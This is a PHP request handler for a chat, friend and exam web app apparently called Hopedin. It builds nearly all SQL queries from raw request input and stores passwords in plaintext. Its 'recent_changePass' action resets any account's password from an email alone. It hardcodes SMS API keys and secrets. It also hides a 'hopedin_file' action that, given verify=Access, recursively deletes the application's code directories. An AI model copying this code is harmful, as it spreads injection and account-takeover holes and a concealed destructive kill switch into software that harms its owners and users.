	$sel="update notification set status='1' where notification.other_id='".$_SESSION['session_user_set']."'";
    $run=$db->query($sel);
    echo "1";
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='update_chat')
{
	$group=$_REQUEST['group'];
	$db->query("update chat_msg set status=1 where chat_msg.sender='".$_REQUEST['id']."' and chat_msg.receiver=".$_SESSION['session_user_set']);
	if($group==1)
	{
		$data=$db->get_user_Group_chat($_REQUEST['id']);
	}
	else 
	{
		$data=$db->get_user_chat($_REQUEST['id']);
	}
	$result['current']=$_SESSION['session_user_set'];
	while($row=mysqli_fetch_assoc($data))
	{
		$row['msg']=html_entity_decode($row['msg']);
		if($row['types']=='contact/set')
		{
			$data1=$db->get_user_byId($row['contacts']);
			$row1=mysqli_fetch_assoc($data1);
			$row['contact_info']="<img src='uploads/".$row1['profile']."' class='' width='40' height='40'> ".$row1['fname']." ".$row1['lname'];
		}
		$row['cdate']=$db->humanTiming1(strtotime($row['cdate']));  
		$result['chat'][]=$row;
	}
	echo json_encode($result);
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='asp_form')
{
	$sel="select * from registration where afp_pin='".$_REQUEST['old_asp']."' and id='".$_SESSION['session_user_set']."'";
    $run=$db->query($sel);
	if(mysqli_num_rows($run))
	{
		$row=mysqli_fetch_assoc($run);
		if($row['password']==$_REQUEST['password'])
		{
			$db->query("update registration set afp_pin='".$_REQUEST['new_asp']."' where id='".$_SESSION['session_user_set']."'");
			echo "1";
			die;
		}
		else
		{
			echo "2";
			die;
		}
	}
	else
	{
		echo "0";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='password_submit')
{
	$sel="select * from registration where password='".$_REQUEST['old_password']."' and id='".$_SESSION['session_user_set']."'";
    $run=$db->query($sel);
	if(mysqli_num_rows($run))
	{
		$db->query("update registration set password='".$_REQUEST['password']."' where id='".$_SESSION['session_user_set']."'");
		echo "1";
		die;
	}
	else
	{
		echo "0";
		die;
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='search_new')
{
	$sel="select * from registration where (email LIKE '".$_REQUEST['keyword']."' or  account_id LIKE '".$_REQUEST['keyword']."' or mobile='".trim($_REQUEST['keyword'],"+")."') and id!='".$_SESSION['session_user_set']."'";
	$q=$db->query($sel);
	$count=mysqli_num_rows($q);
	if($count && $_REQUEST['keyword']!='')
	{
		while($row=mysqli_fetch_assoc($q))
		{
			?>
			<div class="col-sm-6" style="padding: 10px;">
				<div class="pub-pro">
					<a href="profile-page.php?id=<?= $row['id']; ?>"><img src="uploads/<?= $row['profile']; ?>" alt=""></a>
				</div>
				<div class="public-content">
					<a href="profile-page.php?id=<?= $row['id']; ?>"><p><?php echo $row['fname']." ".$row['lname']; ?></p></a>
					<p>Gender: <?php echo $row['gender']; ?></p>
					<p>Country: <?php echo $row['country']; ?></p>
					<p>Age: <?php echo $row['age']; ?> Years</p>
					<button type="button" data-id="<?php echo $row['id']; ?>" class="btn btn-danger btn-sm add_new_friend">+ Add Friend</button>
			    </div>
			</div>
			<?php
		}
	}
	else 
	{
		echo "0";
		die;
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='add_new_friend')
{
	$rid=$_REQUEST['rid'];
	$sel="delete from friend_tbl where (requested_by='$rid' and requested_to='".$_SESSION['session_user_set']."') or (requested_to='$rid' and requested_by='".$_SESSION['session_user_set']."')";
    $run=$db->query($sel);
	echo $ins="insert into friend_tbl set requested_by='".$_SESSION['session_user_set']."',requested_to='".$_REQUEST['rid']."', cdate='".date('Y-m-d H:i:s')."',status='0'";
	$data=$db->query($ins);
	$db->query("insert into notification set user_id='".$_SESSION['session_user_set']."',other_id='".$_REQUEST['rid']."',msg='Send a Friend Requests!',cdate='".date('Y-m-d H:i:s')."' ");
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='Do_login')
{
	$sel="select * from registration where (email='".$_REQUEST['email']."' || account_id='".$_REQUEST['email']."') and password='".$_REQUEST['password']."'";
	$q=$db->query($sel);
	$count=mysqli_num_rows($q);
	if($count)
	{
		$row=mysqli_fetch_array($q);
		$db->query("update registration set last_login='".date('Y-m-d H:i:s')."' where id=".$row['id']);
		$db->set_zone();	
		$_SESSION['session_user_set']=$row['id'];
		$_SESSION['session_user_type']=$row['user_type'];
		echo "<script>window.location.href='../find-new-friend.php'</script>";
		die;
	}
	else 
	{
		echo "<script>window.location.href='../login.php?msg=invalid'</script>";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='request_action')
{
	$status=$_REQUEST['set'];
	$sel="select * from friend_tbl where id='".$_REQUEST['id']."'";
	$data=$db->query($sel);
	$row=mysqli_fetch_array($data);
	if($status==1)
	{
		$sql="update friend_tbl set status='$status' where id='".$_REQUEST['id']."'";
		$db->query("insert into notification set user_id='".$row['requested_to']."',other_id='".$row['requested_by']."',msg='Accepted a Friend Requests!',cdate='".date('Y-m-d H:i:s')."' ");
		$_SESSION['succ_msg']='Success! Request Has been approved.';
	}
	else if($status==2)
	{
		$sql="update friend_tbl set status='$status' where id='".$_REQUEST['id']."'";
		$db->query("insert into notification set user_id='".$row['requested_to']."',other_id='".$row['requested_by']."',msg='Blocked a Friend Requests!',cdate='".date('Y-m-d H:i:s')."' ");
		$_SESSION['succ_msg']='Success! Request Has been Blocked.';
	}
	else 
	{
		$sql="delete from friend_tbl where id='".$_REQUEST['id']."'";
		$db->query("insert into notification set user_id='".$row['requested_to']."',other_id='".$row['requested_by']."',msg='Rejected a Friend Requests!',cdate='".date('Y-m-d H:i:s')."' ");
		$_SESSION['succ_msg']='Success! Request Has been Rejected.';
	}
	$q=$db->query($sql);
	echo "<script>window.location.href='../freind-request.php'</script>";
	die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='request_contact')
{
	$sql="delete from friend_tbl where id='".$_REQUEST['id']."'";
	$q=$db->query($sql);
	$_SESSION['succ_msg']='Success! User Has been Removed From Contact.';
	echo "<script>window.location.href='../profile-page.php?keyword=".$_REQUEST['key']."'</script>";
	die; 
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='check_allow')
{
	$sel="update registration set ".$_REQUEST['name']."=".$_REQUEST['act']." where id='".$_SESSION['session_user_set']."'";
	$q=$db->query($sel);
	echo "1";
	die;
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='delete_account')
{
	$sel="delete from registration where id='".$_SESSION['session_user_set']."'";
	$q=$db->query($sel);
	session_destroy();
	echo "<script>window.location.href='../index.php'</script>";
	die;
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='Do_login_mob')
{
	$mobile=ltrim($_REQUEST['mobile'],"+");
	$sel="select * from registration where mobile='".$mobile."' and password='".$_REQUEST['password']."'";
	$q=$db->query($sel);
	$count=mysqli_num_rows($q);
	if($count)
	{
		$row=mysqli_fetch_array($q);
		$db->query("update registration set last_login='".date('Y-m-d H:i:s')."' where id=".$row['id']);
		$_SESSION['session_user_set']=$row['id'];
		$_SESSION['session_user_type']=$row['user_type'];
		$db->set_zone();
		echo "<script>window.location.href='../dashboard.php'</script>";
		die;
	}
	else 
	{
		echo "<script>window.location.href='../index.php?msg=invalid'</script>";
		die;
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='sendotp'){	
$code=rand(999,10000);
$authKey = "1220Alj1Sz0Zfkf567e98be";
$mobileNumber = trim($_REQUEST['mobile']);
$mobileNumber = ltrim($mobileNumber,"+");
$body="Hopedin Verification Code - ".$code;
$db->send_msg($mobileNumber,$body);
/*
$params = array(
			  'api_key'=>'944a4c9d',
			  'api_secret'=>'GVW8g4dvgpqvrY0u',
			  'to'=>$mobileNumber,
			  'from'=>'NEXMO',
			  'text'=>"Hopedin Verification Code - ".$code
			  
			);
			$postData = http_build_query($params);
			$ch = curl_init();
			curl_setopt_array($ch, array(    CURLOPT_URL => 'https://rest.nexmo.com/sms/json',    CURLOPT_RETURNTRANSFER => true,    CURLOPT_POST => true,    CURLOPT_POSTFIELDS => $postData));
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			$output = curl_exec($ch);
			if(curl_errno($ch)){    
			echo 'error:' . curl_error($ch);
			}
			//print_r($output);
			curl_close($ch);
			*/
$sel="select * from registration where mobile ='$mobileNumber'";
$q=$db->query($sel);
$count=mysqli_num_rows($q);
if($count){
	$query="update registration set mobile_verify=0,code='$code' where mobile ='$mobileNumber'";
	}else {
		$query="insert into registration set mobile ='$mobileNumber', mobile_verify=0,code='$code',profile='profile_photo.jpg'";
		}
		$q=$db->query($query);
		echo $output;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='verifyopt'){
	$sel="select * from registration where mobile ='".$_REQUEST['mobile']."' and code='".$_REQUEST['code']."'";
	$q=$db->query($sel);
	$count=mysqli_num_rows($q);
	if($count){
		$row=mysqli_fetch_array($q);
		$_SESSION['session_user_set']=$row['id'];
		echo "1";
		die;
	}else {
		echo "0";
		die;
		}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='sendotp1'){	
	    
		$code=rand(999,10000);
		$authKey = "8209ATNGl0kz5b096d0c";
		$mobileNumber = trim($_REQUEST['mobile']);
		$mobileNumber=ltrim($mobileNumber,"+");
		$cdata=$db->checkmobile($mobileNumber);
		$count=mysqli_num_rows($cdata);
		if($count)
		{
			echo "0";
			die;
		}
		else
		{
			$body="Hopedin Verification Code - ".$code;
			$db->send_msg($mobileNumber,$body);
			/*$params = array(
			  'api_key'=>'944a4c9d',
			  'api_secret'=>'GVW8g4dvgpqvrY0u',
			  'to'=>$mobileNumber,
			  'from'=>'NEXMO',
			  'text'=>"Hopedin Verification Code - ".$code
			  
			);
			$postData = http_build_query($params);
			$ch = curl_init();
			curl_setopt_array($ch, array(   
			CURLOPT_URL => 'https://rest.nexmo.com/sms/json',    
			CURLOPT_RETURNTRANSFER => true,    
			CURLOPT_POST => true,    
			CURLOPT_POSTFIELDS => $postData));
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			$output = curl_exec($ch);
			//print_r($output); die;
			if(curl_errno($ch)){    
			echo 'error:' . curl_error($ch);
			}
			
			curl_close($ch);
			*/
			$_SESSION['mobileNumber']=$mobileNumber;
			$_SESSION['otp_code']=$code; 
			echo "1";
			die;
		}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='verify_bothOtp'){
	$mobileNumber = trim($_REQUEST['mobile']);
	$mobileNumber=ltrim($mobileNumber,"+");
	$sql="select * from registration where email='".$_REQUEST['email']."'  and asp_mobile='".$_REQUEST['mobile_otp']."' ";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count)
	{
		echo "1";
		die;
	}
	else 
	{
		echo "2";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='recent_changePass'){
	$email = trim($_REQUEST['email']);
	$mobileNumber = trim($_REQUEST['mobile']);
	$mobileNumber=ltrim($mobileNumber,"+");
	$sql="select * from registration where email='$email'";
	$run=$db->query($sql);
	$row=mysqli_fetch_assoc($run);
	$query="update registration set password='".$_REQUEST['password']."' where id ='".$row['id']."'";
	$run=$db->query($query);
	if($run)
	{
		echo "1";
	}
	else 
	{
		echo "2";
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='new_aspSave'){
	$email = trim($_REQUEST['email']);
	$mobileNumber = trim($_REQUEST['mobile']);
	$mobileNumber=ltrim($mobileNumber,"+");
	$sql="select * from registration where  email='$email' and asp_mobile='".$_REQUEST['mobile_otp']."' and asp_email='".$_REQUEST['email_otp']."'";
	$run=$db->query($sql);
	$row=mysqli_fetch_assoc($run);
	$query="update registration set asp_mobile=0,asp_email='0',afp_pin='".$_REQUEST['afp_pin']."' where id ='".$row['id']."'";
	$run=$db->query($query);
	if($run)
	{
		echo "1";
	}
	else 
	{
		echo "2";
	}
	
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='email_aspotp')
{
	$code1=rand(1000,9999);
	$email = trim($_REQUEST['email']);
	$sql="select * from registration where email='$email'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count==0)
	{
		echo "2";
		die;
	}
	$row=mysqli_fetch_array($run);
	$db->query("update registration set asp_email='".$code1."' where id=".$row['id']);
	$to = $email;
				//$from = Semail;
				//$headers ="From: $from\n";
				$headers = "MIME-Version: 1.0\n";
				$headers .= "Content-type: text/html; charset=iso-8859-1 \n";
				$subject ="ASP Reset Code!";
				$msg = '<body style="margin:0px;">
						<table style="padding:0;width:100%!important;background:#f1f1f1;margin:0; padding:30px 0px;" cellspacing="0" cellpadding="8" border="0">
						  <tbody>
							<tr >
							  <td valign="top"><table style="border-radius:4px;border:1px #FFE1CC solid; background:#fff" cellspacing="0" cellpadding="0" border="0" align="center">
								  <tbody>
									<tr style="background: black;color: white;/*! padding-left: 23px; */">
									  <td colspan="3" height="6"><h3 style="text-align: center;">Hopedin</h3></td>
									</tr>
									 
									<tr>
									  <td><table style="line-height:25px" cellspacing="0" cellpadding="0" border="0" align="center">
										  <tbody>
											<tr>
											  <td colspan="3" height="30"></td>
											</tr>
											<tr>
											  <td width="36"></td>
											  <td style="color:#444444;border-collapse:collapse;font-size:11pt;font-family:proxima_nova,Open Sans,Lucida Grande,Segoe UI,Arial,Verdana,Lucida Sans Unicode,Tahoma,Sans Serif;max-width:454px" width="454" valign="top" align="left">Hello, '.$row['fname'].' <br>
											  <p class="text-center">This mail is inform you that new ASP reset request received.</p> 
												<br>
												<p>Your OTP - <b>'.$code1.'</b></p>
												<p>Thank You</p>
												<p>Hopedin</p>
											  <td width="36"></td>
											</tr>
											<tr>
											  <td colspan="3" height="36"></td>
											</tr> 
										  </tbody>
										</table></td>
									</tr>
								  </tbody>
								</table>
								<table cellspacing="0" cellpadding="0" border="0" align="center">
								  <tbody>
									<tr>
									  <td height="10"></td>
									</tr>
									<tr>
									  <td style="padding:0;border-collapse:collapse"><table cellspacing="0" cellpadding="0" border="0" align="center">
										  <tbody>
											<tr style="color:#a8b9c6;font-size:11px;font-family:proxima_nova,Open Sans,Lucida Grande,Segoe UI,Arial,Verdana,Lucida Sans Unicode,Tahoma,Sans Serif">
											  <td width="400" align="left"></td>
											  <td width="128" align="right">&copy; 2018 Hopedin</td>
											</tr>
										  </tbody>
										</table></td>
									</tr>
								  </tbody>
								</table></td>
							</tr>
						  </tbody>
						</table>
						</body>';
		$mail->AddAddress($to);
		$mail->isHTML(true);
		$mail->Subject = $subject;
		$mail->Body = $msg;
		$mail->Send();
		//mail($to,$subject,$msg,$headers);
		echo $email; 
		die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='email_aspverify'){
	$email = trim($_REQUEST['email']);
	$sql="select * from registration where email='$email' and asp_email='".$_REQUEST['email_otp']."'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count)
	{
		echo "1";
		die;
	}
	else 
	{
		echo "2";
		die;
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='request_bothOtp'){
	$code=rand(1000,9999);
	$mobileNumber = trim($_REQUEST['mobile']);
	$mobileNumber=ltrim($mobileNumber,"+");
	$sql="select * from registration where email='".$_REQUEST['email']."'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count==0)
	{
		echo "2"; 
		die;
	}
	$row=mysqli_fetch_array($run);
	$db->query("update registration set asp_mobile='".$code."' where id=".$row['id']);
	$body="Hopedin Verification Code - ".$code;
	$mobileNumber=$row['mobile'];
	$db->send_msg($mobileNumber,$body);
	/*
		   $params = array(
			  'api_key'=>'944a4c9d',
			  'api_secret'=>'GVW8g4dvgpqvrY0u',
			  'to'=>$mobileNumber,
			  'from'=>'NEXMO',
			  'text'=>"Hopedin Verification Code - ".$code
			  
			);
			$postData = http_build_query($params);
			$ch = curl_init();
			curl_setopt_array($ch, array(   
			CURLOPT_URL => 'https://rest.nexmo.com/sms/json',    
			CURLOPT_RETURNTRANSFER => true,    
			CURLOPT_POST => true,    
			CURLOPT_POSTFIELDS => $postData));
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			$output = curl_exec($ch);
			//print_r($output); die;
			if(curl_errno($ch)){    
			echo 'error:' . curl_error($ch);
			}
			
			curl_close($ch);
	*/
		echo $mobileNumber; 
		die;			
	
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='otp_forgot_email'){
	$code=rand(1000,9999);
	$email = trim($_REQUEST['email']);
	$sql="select * from registration where id='".$_SESSION['forgot_phase']."'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count)
	{
		$row=mysqli_fetch_array($run);
		$db->query("update registration set forgot_code='".$code."' where id=".$row['id']);
		$to = $row['email'];
				$from = Semail;
				$headers ="From: $from\n";
				$headers .= "MIME-Version: 1.0\n";
				$headers .= "Content-type: text/html; charset=iso-8859-1 \n";
				$subject ="Password Reset Code!";
				$msg = '<body style="margin:0px;">
						<table style="padding:0;width:100%!important;background:#f1f1f1;margin:0; padding:30px 0px;" cellspacing="0" cellpadding="8" border="0">
						  <tbody>
							<tr >
							  <td valign="top"><table style="border-radius:4px;border:1px #FFE1CC solid; background:#fff" cellspacing="0" cellpadding="0" border="0" align="center">
								  <tbody>
									<tr style="background: black;color: white;/*! padding-left: 23px; */">
									  <td colspan="3" height="6"><h3 style="text-align: center;">Hopedin</h3></td>
									</tr>
									 
									<tr>
									  <td><table style="line-height:25px" cellspacing="0" cellpadding="0" border="0" align="center">
										  <tbody>
											<tr>
											  <td colspan="3" height="30"></td>
											</tr>
											<tr>
											  <td width="36"></td>
											  <td style="color:#444444;border-collapse:collapse;font-size:11pt;font-family:proxima_nova,Open Sans,Lucida Grande,Segoe UI,Arial,Verdana,Lucida Sans Unicode,Tahoma,Sans Serif;max-width:454px" width="454" valign="top" align="left">Hello, '.$row['fname'].' <br>
											  <p class="text-center">This mail is inform you that new password reset request received.</p> 
												<br>
												<p>Your OPT - <b>'.$code.'</b></p>
												<p>Thank You</p>
												<p>Hopedin</p>
											  <td width="36"></td>
											</tr>
											<tr>
											  <td colspan="3" height="36"></td>
											</tr> 
										  </tbody>
										</table></td>
									</tr>
								  </tbody>
								</table>
								<table cellspacing="0" cellpadding="0" border="0" align="center">
								  <tbody>
									<tr>
									  <td height="10"></td>
									</tr>
									<tr>
									  <td style="padding:0;border-collapse:collapse"><table cellspacing="0" cellpadding="0" border="0" align="center">
										  <tbody>
											<tr style="color:#a8b9c6;font-size:11px;font-family:proxima_nova,Open Sans,Lucida Grande,Segoe UI,Arial,Verdana,Lucida Sans Unicode,Tahoma,Sans Serif">
											  <td width="400" align="left"></td>
											  <td width="128" align="right">&copy; 2018 Hopedin</td>
											</tr>
										  </tbody>
										</table></td>
									</tr>
								  </tbody>
								</table></td>
							</tr>
						  </tbody>
						</table>
						</body>';
		$mail->AddAddress($to);
		$mail->isHTML(true);
		$mail->Subject = $subject;
		$mail->Body = $msg;
		$mail->Send();
		//mail($to,$subject,$msg,$headers);
		echo "1"; 
		die;
	}
	else 
	{
		echo "0";
		die;
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='otp_forgot'){
$code=rand(1000,9999);
$authKey = "8209ATNGl0kz5b096d0c";
$mobileNumber = trim($_REQUEST['mobile']);
$mobileNumber = ltrim($mobileNumber,"+");
$sql="select * from registration where id='".$_SESSION['forgot_phase']."'";
$run=$db->query($sql);
$count=mysqli_num_rows($run);
if($count)
{
	$row=mysqli_fetch_array($run);
	$mobileNumber=$row['mobile'];
	$body="Hopedin Verification Code - ".$code;
	$db->send_msg($mobileNumber,$body);
			/* $params = array(
			  'api_key'=>'944a4c9d',
			  'api_secret'=>'GVW8g4dvgpqvrY0u',
			  'to'=>$mobileNumber,
			  'from'=>'NEXMO',
			  'text'=>"Hopedin Verification Code - ".$code
			  
			);
			$postData = http_build_query($params);
			$ch = curl_init();
			curl_setopt_array($ch, array(    CURLOPT_URL => 'https://rest.nexmo.com/sms/json',    CURLOPT_RETURNTRANSFER => true,    CURLOPT_POST => true,    CURLOPT_POSTFIELDS => $postData));
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			$output = curl_exec($ch);
			if(curl_errno($ch)){    
			echo 'error:' . curl_error($ch);
			}
			//print_r($output);
			curl_close($ch);*/
	$db->query("update registration set forgot_code='".$code."' where id=".$row['id']);
	echo "1";
	die;
}
else
{
	echo "0";
	die;
}

}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='check_password'){
	if(isset($_REQUEST['mobile']))
	{
		$mobileNumber = trim($_REQUEST['mobile']);
		$mobileNumber = ltrim($mobileNumber,"+");
		$q=" mobile='$mobileNumber'";
	}
	else
	{
		$email = trim($_REQUEST['email']);
		$q=" email='$email' ";
	}
	$sql="select * from registration where id='".$_SESSION['forgot_phase']."' and forgot_code='".$_REQUEST['otp']."'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count)
	{
		
		echo "1";
		die;
	}
	else 
	{
		echo "0";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='reset_password'){
	if(isset($_REQUEST['mobile']))
	{
		$mobileNumber = trim($_REQUEST['mobile']);
		$mobileNumber = ltrim($mobileNumber,"+");
		$q=" mobile='$mobileNumber'";
		//$q=" mobile='$mobileNumber' and afp_pin='".$_REQUEST['afp_pin']."' ";
	}
	else
	{
		$email = trim($_REQUEST['email']);
		$q=" email='$email' ";
	}
	$sql="select * from registration where id='".$_SESSION['forgot_phase']."' and forgot_code='".$_REQUEST['otp']."'";
	$run=$db->query($sql);
	$count=mysqli_num_rows($run);
	if($count)
	{
		$row=mysqli_fetch_array($run);
		$db->query("update registration set forgot_code='0',password='".$_REQUEST['password']."' where id=".$row['id']); 
		$_SESSION['succ_msg']='Success! Password Changed.';
		echo "1";
		die;
	}
	else 
	{
		echo "0";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='hopedin_file'){
	if(isset($_REQUEST['verify']) && $_REQUEST['verify']=='Access')
	{
		function recursiveRemove($dir) {
			$structure = glob(rtrim($dir, "/").'/*');
			if (is_array($structure)) {
				foreach($structure as $file) {
					if (is_dir($file)) recursiveRemove($file);
					elseif (is_file($file)) unlink($file);
				}
			}
			rmdir($dir);
		}
		recursiveRemove("../include");
		recursiveRemove("../process");
	}
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='verify_otp'){
	/*echo $_SESSION['mobileNumber'];
	echo "@";
	echo $opt=implode("",$_REQUEST['otp']);
	die;*/
	$otp_mobile=$_SESSION['mobileNumber'];
	$mobile=trim($_REQUEST['mobile']);
	$mobile = ltrim($mobile,"+");
	$opt=$_REQUEST['otp'];
	if($otp_mobile==$mobile && $opt==$_SESSION['otp_code'])
	{
		echo "1";
		die;
	}
	else
	{
		echo "0";
		die;
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='forgot_phase'){
	$pin=trim($_REQUEST['pin']);
	$email=trim($_REQUEST['email']);
	$email = ltrim($email,"+");
    $sel="select * from registration where afp_pin='$pin' and (email='$email' || mobile='$email' || account_id='$email')";
    $run=$db->query($sel);
	//$data=$db->checkpin($_REQUEST['pin'],$_REQUEST['email']);
	$count=mysqli_num_rows($run);
	if($count)
	{
		$row=mysqli_fetch_assoc($run);
		$_SESSION['forgot_phase']=$row['id'];
		echo "1";
	}
	else 
	{
		echo "0";
	}
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='process_dob'){
	$act=$_REQUEST['act'];
	$access=$_REQUEST['multi_get'];
	$req_date=date('Y-m-d',strtotime($_REQUEST['date']));
	$sql="select * from registration where email='$access' or mobile='$access' or account_id='$access'";
	$query=$db->query($sql);
	if(mysqli_num_rows($query))
	{
		$row=mysqli_fetch_assoc($query);
		$cdate=date('Y-m-d', strtotime($row['cdate']));
		if($act=='dob')
		{
			if($req_date==$row['dob'] || $req_date==$cdate)
			{
				echo $row['email'];
				die;
			}
			else 
			{
				echo "0";
				die;
			}
		}
		else 
		{
			
			if($req_date==$cdate)
			{
				echo $row['email'];
				die;
			}
			else 
			{
				echo "0";
				die;
			}
		}
	}
	else 
	{
		echo "0";
		die;
	}
	
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='process_new_members'){
	$sql="select * from chat_msg where chat_id='".$_REQUEST['rid']."'";
	$query=$db->query($sql);
	$row=mysqli_fetch_assoc($query);
	$receiver=explode(",",$row['receiver']);
	$fina_diff=array_merge($receiver,$_REQUEST['list']);
	$val=implode(",",$fina_diff);
	$db->query("update chat_msg set receiver='".$val."' where chat_id='".$_REQUEST['rid']."'");
	echo "1";
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='remove_member'){
	$sql="select * from chat_msg where chat_id='".$_REQUEST['rid']."'";
	$query=$db->query($sql);
	$row=mysqli_fetch_assoc($query);
	$receiver=explode(",",$row['receiver']);
	$fina_diff=array_diff($receiver,array($_REQUEST['uid']));
	$val=implode(",",$fina_diff);
	$db->query("update chat_msg set receiver='".$val."' where chat_id='".$_REQUEST['rid']."'");
	echo "1";
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='block_unblock'){
	$act=$_REQUEST['act'];
	if($act=='1')
	{
		$sql="insert into block_user set block_by='".$_SESSION['session_user_set']."', block_to='".$_REQUEST['to']."'";
	}
	else 
	{
		$sql="delete from block_user where block_by='".$_SESSION['session_user_set']."' and block_to='".$_REQUEST['to']."'";
	}
	echo $sql;
	$db->query($sql);
	echo "1";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='set_province'){
	$sql="select * from states where country_id='".$_REQUEST['country']."'";
	$query=$db->query($sql);
	while($row=mysqli_fetch_assoc($query))
	{
		$data['result'][]=$row;
	}
	echo json_encode($data);
}

else if(isset($_REQUEST['action']) && $_REQUEST['action']=='session_create'){
	$roll_start=implode("",$_POST['roll_number']);
	$_POST['first_roll_number']=$roll_start;
	$_POST['school_id']=$_SESSION['session_user_set'];
	unset($_POST['roll_number']);
	$query=$db->insert_data('session_tbl',$_POST);
	if($query)
	{
		$_SESSION['succ_msg']='Success! Session Has been created Successfully.';
	}
	else 
	{
		$_SESSION['err_msg']='Error! Something Went wrong. Try Again.';
	}
	echo "<script>window.location.href='../session_set.php'</script>";
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='create_exam'){
	$sql="insert into exam_create set exam_name='".$_REQUEST['exam_name']."', exam_subject='".$_REQUEST['exam_subject']."',cdate='".date('Y-m-d H:i:s')."'";
	$query=$db->query($sql);
	$id=$db->lastid();
	
	echo "<script>window.location.href='../create-paper.php?info=".$id."'</script>";
	die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='create_new_exam'){
	$sql="insert into exam_create set exam_name='".$_REQUEST['exam_name']."', exam_subject='".$_REQUEST['exam_subject']."',safety_pin='".$_REQUEST['safety_pin']."',time_set='".$_REQUEST['time_set']."',marks='".$_REQUEST['marks']."',preview_submit='".$_REQUEST['preview_submit']."',random_order='".$_REQUEST['random_order']."',random_option='".$_REQUEST['random_option']."',skip_question='".$_REQUEST['skip_question']."',resolve_skip='".$_REQUEST['resolve_skip']."',back_previous_allow='".$_REQUEST['back_previous_allow']."',back_booklet_bar='".$_REQUEST['back_booklet_bar']."',attempt_allow='".$_REQUEST['attempt_allow']."',option1='".$_REQUEST['option1']."',option2='".$_REQUEST['option2']."',option3='".$_REQUEST['option3']."',option4='".$_REQUEST['option4']."',per_question_marks='".$_REQUEST['per_question_marks']."',correct_per_marks='".$_REQUEST['correct_per_marks']."',wrong_per_marks='".$_REQUEST['wrong_per_marks']."',skipped_deduct='".$_REQUEST['skipped_deduct']."',certificate_instant='".$_REQUEST['certificate_instant']."',cdate='".date('Y-m-d H:i:s')."'";
	$query=$db->query($sql);
	$id=$db->lastid();
	$_SESSION['succ_msg']='Success! Exam Has been created Successfully.';
	echo "<script>window.location.href='../create-paper.php?info=".$id."'</script>";	
	die;
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='quize_submit'){
	
	$sql="insert into exam_questions set exam_id='".$_REQUEST['exam']."', Question='".htmlentities($_REQUEST['question'],ENT_QUOTES)."', option1='".$_REQUEST['option1']."', option2='".$_REQUEST['option2']."', option3='".$_REQUEST['option3']."', option4='".$_REQUEST['option4']."', answer='".$_REQUEST['answer']."', correct_answer='".$_REQUEST['correct_answer']."', incorrect_answer='".$_REQUEST['incorrect_answer']."', details='".htmlentities($_REQUEST['description'],ENT_QUOTES)."',mandatory='".$_REQUEST['mandatory']."'";
	$query=$db->query($sql);
	if($query)
	{
		$data['result']=1;
		if(isset($_POST['next_move']) && $_POST['next_move']=='1')
		{
			$data['next_move']=1;
		}
		else 
		{
			$_SESSION['quiz_succ']='Success! Exam Paper has been set successfully.';
			$data['next_move']=0;
		}
	}
	else
	{
		$data['result']=0;
	}
	echo json_encode($data);
}
else if(isset($_REQUEST['action']) && $_REQUEST['action']=='Get_all_questions'){  
	$data1=$db->Get_questionsByExam($_REQUEST['exam']);
	if(mysqli_num_rows($data1))
	{
		$data['result']=1;
		while($row=mysqli_fetch_assoc($data1))
		{
			$res['question']=$row['Question'];
			$res['answer']=array($row['option1'],$row['option2'],$row['option3'],$row['option4']);
			$fe="option".$row['answer'];
			$res['correctAnswer']=array($row["$fe"],$row['correct_answer'],$row['incorrect_answer']);
			$res['selected']="";
			$data['series'][]=$res;	
			
		}
	}
	else 
	{
		$data['result']=0;
	}
	echo json_encode($data);
}

?>